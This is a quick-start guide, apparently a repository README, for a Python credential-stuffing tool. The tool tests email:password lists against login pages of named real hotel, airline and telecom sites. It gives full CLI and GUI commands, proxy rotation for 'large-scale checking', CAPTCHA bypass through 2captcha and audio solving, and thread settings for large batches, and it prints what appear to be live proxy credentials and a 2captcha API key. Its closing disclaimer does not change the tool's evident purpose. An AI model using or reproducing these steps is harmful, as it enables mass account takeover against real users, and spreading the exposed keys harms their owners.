# Quick Start Guide

## Installation

### Step 1: Install Dependencies

```bash
# Clone the repository
git clone https://github.com/legendhkek/Legend.git
cd Legend

# Install required packages
pip install -r requirements.txt

# Optional: Install Selenium for advanced site handling
pip install selenium webdriver-manager
```

### Step 2: Verify Installation

```bash
# Test proxy parsing
python3 test_proxies.py

# Test site detection
python3 test_sites.py
```

## Basic Usage

### GUI Mode (Easiest)

1. Start the GUI:
```bash
python3 advancedchecker.py
```

2. Configure settings:
   - **Default Site**: Enter the site URL (e.g., `https://www.ihg.com`)
   - **Accounts File**: Browse and select your accounts file
   - **Proxies** (optional): Enable and load proxy files
   - **CAPTCHA Solver** (optional): Enable and enter API key

3. Click **Start Checking** to begin

### CLI Mode (Headless)

#### Check Sites

```bash
# Check if login pages can be detected
python3 advancedchecker.py --check-sites ihg.com flyfrontier.com sky.com
```

#### Check Credentials

```bash
# Basic check
python3 advancedchecker.py --check-creds example_accounts.txt --site https://example.com

# With proxies
python3 advancedchecker.py --check-creds example_accounts.txt \
    --site https://example.com \
    --proxies \
    --proxy-file example_proxies.txt
```

## Configuration Examples

### 1. Testing IHG Hotels

**GUI Method:**
1. Set Default Site: `https://www.ihg.com`
2. Load accounts file with format: `email:password`
3. Click "Analyze Site" to verify detection
4. Click "Start Checking"

**CLI Method:**
```bash
python3 advancedchecker.py --check-creds accounts.txt --site https://www.ihg.com
```

### 2. Using Proxies

**Proxy File Format** (`proxies.txt`):
```
# Simple format
1.2.3.4:8080:username:password

# Residential proxy with complex credentials
p1.arealproxy.com:9000:zaym246-type-residential-country-gb:fd86cea5-501a-401e-a1d4-b372c33ced0e
```

**Usage:**
```bash
python3 advancedchecker.py --check-creds accounts.txt \
    --site https://example.com \
    --proxies \
    --proxy-file proxies.txt \
    --threads 10
```

### 3. Using CAPTCHA Solver

**2captcha API Example:**

1. Get API key from https://2captcha.com
2. In GUI:
   - Enable "Use CAPTCHA Solver"
   - Select "2CAPTCHA" as provider
   - Enter API key in "2Captcha API Key" field

3. Or via code:
```python
from advancedchecker import UniversalAccountChecker

checker = UniversalAccountChecker()
checker.configure_captcha_solver([
    ('2captcha', 'YOUR_API_KEY_HERE')
])
```

**Test API Key:**
```
a9c730ba8bc503517961db5a94892775
```
(This is the key provided for testing - replace with your own for production)

### 4. Testing with Provided Proxy

```bash
# Test the provided residential proxy
python3 test_proxies.py "p1.arealproxy.com:9000:zaym246-type-residential-country-gb:fd86cea5-501a-401e-a1d4-b372c33ced0e"
```

## Supported Sites

The tool has optimized handlers for:

| Site | URL | Status |
|------|-----|--------|
| IHG Hotels | https://www.ihg.com | ✓ Supported |
| Frontier Airlines | https://www.flyfrontier.com | ✓ Supported |
| Accor Hotels | https://all.accor.com | ✓ Supported |
| Virgin Media O2 | https://www.virginmediao2.co.uk | ✓ Supported |
| Sky | https://www.sky.com | ✓ Supported |
| Generic Sites | Any site with login form | ✓ Auto-detect |

## Troubleshooting

### Issue: "No accounts loaded"
**Solution:** Check your accounts file format. Should be:
```
email@example.com:password123
```

### Issue: "No proxies loaded"
**Solution:** Verify proxy file exists and has correct format:
```
host:port:username:password
```

### Issue: "CAPTCHA detected"
**Solution:** 
1. Enable CAPTCHA solver in settings
2. Enter valid 2captcha API key
3. Or use Selenium for manual solving

### Issue: "Rate limited"
**Solution:**
1. Increase delay between requests (e.g., 2-5 seconds)
2. Use proxies to distribute requests
3. Reduce thread count

### Issue: "Selenium not available"
**Solution:**
```bash
pip install selenium webdriver-manager
```

### Issue: "GUI not available"
**Solution:**
```bash
# Ubuntu/Debian
sudo apt-get install python3-tk

# macOS
brew install python-tk
```

## Advanced Features

### Custom Site Configuration

Add your own site handler:

```python
from advancedchecker import UniversalSiteAnalyzer

analyzer = UniversalSiteAnalyzer()
analyzer.site_specific_configs['mysite.com'] = {
    'login_paths': ['/login', '/signin'],
    'username_fields': ['email', 'username'],
    'password_fields': ['password', 'pass'],
    'working_url': 'https://mysite.com/login'
}
```

### Selenium for Complex Sites

```python
from selenium_login_helper import SeleniumLoginHelper

helper = SeleniumLoginHelper(headless=True)
success, message = helper.login(
    url='https://example.com/login',
    email='user@example.com',
    password='password123'
)
print(f"Result: {message}")
```

### Local CAPTCHA Solving

```bash
# Install audio solver dependencies
pip install SpeechRecognition pydub ffmpeg-python

# Use in code
from selenium_captcha_solver import LocalCaptchaSolver

solver = LocalCaptchaSolver(driver)
success, message = solver.solve_hcaptcha_audio()
```

## Performance Tips

1. **Threads**: Start with 10, increase to 20-50 for large batches
2. **Timeout**: Use 20-30 seconds for slow sites
3. **Delay**: Use 1-3 seconds to avoid rate limiting
4. **Proxies**: Rotate regularly for best results
5. **CAPTCHA**: Use API solver for production (local solver is experimental)

## Best Practices

1. ✓ Test with small batches first (10-20 accounts)
2. ✓ Use proxies for large-scale checking
3. ✓ Enable CAPTCHA solver if needed
4. ✓ Monitor logs for errors
5. ✓ Save results regularly
6. ✗ Don't abuse rate limits
7. ✗ Don't use on unauthorized sites
8. ✗ Don't share API keys publicly

## Getting Help

If you encounter issues:

1. Check logs: `universal_checker_debug.log`
2. Run test scripts: `test_proxies.py`, `test_sites.py`
3. Read full documentation: `README.md`
4. Contact support:
   - Telegram: @legend_bl
   - Email: sarthakgrid1@gmail.com

## Next Steps

- Read full documentation in `README.md`
- Explore example files: `example_accounts.txt`, `example_proxies.txt`
- Test with your own sites and credentials
- Configure CAPTCHA solver for production use
- Set up proxy rotation for reliability

---

**Note**: Always obtain proper authorization before testing any site. This tool is for educational and authorized testing purposes only.
